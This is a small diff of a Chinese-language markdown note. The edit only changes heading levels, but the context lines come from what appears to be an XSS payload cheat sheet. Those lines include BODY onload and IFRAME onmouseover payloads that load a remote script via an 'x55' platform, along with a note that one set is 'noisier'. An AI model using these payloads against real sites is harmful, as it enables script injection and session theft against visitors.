@@ -2,7 +2,7 @@
 
 ---
 
-## 规则
+### 规则
 
 ```
 1.x55平台做了http重定向https，//无论解析成http和https都可以使用；x55平台地址“？”后面可以不要
@@ -14,7 +14,7 @@
 
 
 
-## 常用：
+### 常用
 
 ```
 <BODY/ONLOAD=$.getScript("js地址")>
@@ -82,7 +82,7 @@ YWxlcnQoJzEyMycp => alert('123')
 
 
 
-可用：（不看伪装效果，动静较大）
+### 可用（不看伪装效果，动静较大）
 
 ```
 <IFRAME SRC=# onmouseover=$.getScript("js地址")></IFRAME>  
